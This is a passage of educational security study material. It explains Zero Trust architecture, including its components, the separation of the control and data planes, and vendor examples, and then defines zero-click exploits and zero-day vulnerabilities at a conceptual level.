2. Better access controls - Include more stringent limits regarding who or what can access resources and from what locations.

3. Improved governance and compliance - Limit data access and provide greater operational visibility on user and device activity.

4. Increased granularity - Grants users access to what they need when they need it.

A Zero Trust architecture requires a thorough understanding of the many components and technologies used within an organization's network. The following list outlines the essential components of a Zero Trust architecture:

1. Network and endpoint security - Controls access to applications, data, and networks.

2. Identity and access management (IAM) - Ensures only verified users can access systems and data.

3. Policy-based enforcement - Restricts network traffic to only legitimate requests.

4. Cloud security - Manages access to cloud-based applications, services, and data.

5. Network visibility - Analyzes network traffic and devices for suspicious activity.

6. Network segmentation - Controls access to sensitive data and capabilities from trusted locations.

7. Data protection - Controls and secures access to sensitive data, including encryption and auditing.

8. Threat detection and prevention - Identifies and prevents attacks against the network and the systems connected to it.

Zero Trust Security Concepts

Zero trust is a security model that assumes that all devices, users, and services are not inherently trusted, regardless of whether inside or outside a network's perimeter. Instead, the zero trust model requires all users and devices to be authenticated and authorized before accessing network resources. The zero trust model includes several fundamental concepts that provide a comprehensive security solution.

1. Adaptive Identity - Recognizes that user identities are not static and that identity verification must be continuous and based on a user's current context and the resources they are attempting to access.

2. Threat Scope Reduction - Means that access to network resources is granted on a need-to-know basis, and access is limited to only those resources required to complete a specific task. This concept reduces the network's attack surface and limits the damage that a successful attack can cause.

3. Policy-driven Access Control - Describes how access control policies are used to enforce access restrictions based on user identity, device posture, and network context.

4. Device Posture - Refers to the security status of a device, including its security configurations, software versions, and patch levels. In a security context, device posture assessment involves evaluating the security status of a device to determine whether it meets certain security requirements or poses a risk to the network.

Significance of Control and Data Planes in Zero Trust Models
In a zero trust architecture, the control and data planes are implemented separately and have different functions.

1. Control Plane
The control plane (in zero trust architecture, functions that define policy and determine access decisions) manages policies that dictate how users and devices are authorized to access network resources. It is implemented through a centralized policy decision point. The policy decision point is responsible for defining policies that limit access to resources on a need-to-know basis, monitoring network activity for suspicious behavior, and updating policies to reflect changing network conditions and security threats. The policy decision point is comprised of two subsystems:

i. Policy Engine - Is configured with subject and host identities and credentials, access control policies, up-to-date threat intelligence, behavioral analytics, and other results of host and network security scanning and monitoring. This comprehensive state data allows it to define an algorithm and metrics for making dynamic authentication and authorization decisions on a per-request basis.

ii. Policy Administrator - Is responsible for managing the process of issuing access tokens and establishing or tearing down sessions, based on the decisions made by the policy engine. The policy administrator implements an interface between the control plane and the data plane.

2. Data Plane
Where systems in the control plane define policies and make decisions, systems in the data plane establish sessions for secure information transfers. In the data plane, a subject (user or service) uses a system (such as a client host PC, laptop, or smartphone) to make requests for a given resource. A resource is typically an enterprise app running on a server or cloud. Each request is mediated by a policy enforcement point. The enforcement point might be implemented as a software agent running on the client host that communicates with an app gateway. The policy enforcement point interfaces with the policy administrator to set up a secure data pathway if access is approved, or tear down a session if access is denied or revoked.

The processes implementing the policy enforcement point are the only ones permitted to interface with the policy administrator. It is critical to establish a root of trust for these processes so that policy decisions cannot be tampered with.

The data pathway established between the policy enforcement point and the resource is referred to as an implicit trust zone. For example, the outcome of a successful access request might be an IPsec tunnel established between a digitally signed agent process running on the client, a trusted web application gateway, and the resource server. Because the data is protected by IPsec transport encryption, no tampering by anyone with access to the underlying network infrastructure (switches, access points, routers, and firewalls) is possible.

The goal of zero trust design is to make this implicit trust zone as small as possible and as transient as possible. Trusted sessions might only be established for individual transactions. This granular or microsegmented approach is in contrast with perimeter-based models, where trust is assumed once a user has authenticated and joined the network. In zero trust, place in the network is not a sufficient reason to trust a subject request. Similarly, even if a user is nominally authenticated, behavioral analytics might cause a request to be blocked or a session to be terminated.

Separating the control plane and data plane is significant because it allows for a more flexible and scalable network architecture. The centralized control plane ensures consistency for access request handling across both the managed enterprise network and unmanaged Internet or third-party networks, regardless of the devices being used or the user's location. This makes managing access control policies and monitoring network activity for suspicious behavior easier. Continuous monitoring via the independent control plane means that sessions can be terminated if anomalous behavior is detected.

Zero Trust Architecture Examples

1. Google BeyondCorp - Google's BeyondCorp is a widely recognized example of a zero trust security architecture. BeyondCorp uses a system of multiple security layers, including identity verification, device verification, and access control policies, to secure Google's internal network. This has enabled Google to provide its employees with remote access to company resources while maintaining high security.

2. Cisco Zero Trust Architecture - Cisco has developed a comprehensive zero trust security architecture incorporating network segmentation, access control policies, and threat detection and response capabilities. The architecture is designed to protect against a wide range of cyber threats, including insider threats and external attacks.

3. Palo Alto Networks Prisma Access - Prisma Access is a cloud-delivered security service that uses a zero trust architecture to secure network traffic. It provides secure access to cloud and Internet resources while also preventing data exfiltration and other cyber threats.
Zero-click (Message-Based Vector) - The most powerful exploits are zero-click. Most file-based exploit code has to be deliberately opened by the user. Zero-click means that simply receiving an attachment or viewing an image on a webpage triggers the exploit.
Zero-Day Vulnerabilities - A vulnerability in software that is unpatched by the developer or an attack that exploits such a vulnerability.

Zero-day vulnerabilities refer to previously unknown software or hardware flaws that attackers can exploit before developers or vendors become aware of or have a chance to fix them. The term "zero-day" signifies that developers have "zero days" to fix the problem once the vulnerability becomes known. These vulnerabilities are significant because they can cause widespread damage before a patch is available.

An attacker exploiting a zero-day vulnerability can compromise systems, steal sensitive data, launch further attacks, or cause other forms of harm, often undetected. The stealth and unpredictability of zero-day attacks make them particularly dangerous. They are a favored tool of advanced threat actors, such as organized crime groups and nation-state attackers, who often use them in targeted attacks against high-value targets, such as governmental institutions and major corporations.

Since these vulnerabilities are unknown to the public or the vendor during exploitation, traditional security measures like antivirus software and firewalls, which rely on known signatures or attack patterns, are often ineffective against them. The discovery of a zero-day vulnerability typically triggers a race between threat actors, who aim to exploit it, and developers, who work to patch it. Upon discovering a zero-day vulnerability, ethical security researchers usually follow a process known as responsible disclosure, which is designed to privately inform the vendor so a patch can be developed before the vulnerability is publicly disclosed. This practice aims to limit the potential harm caused by discovering a zero-day vulnerability.

The term "zero-day" is usually applied to the vulnerability itself but can also refer to an attack or malware that exploits it.

Zero-day vulnerabilities have significant financial value. A zero-day exploit for a mobile OS can be worth millions of dollars. Consequently, an adversary will only use a zero-day vulnerability for high-value attacks. State security and law enforcement agencies are known to stockpile zero-days to facilitate the investigation of crimes.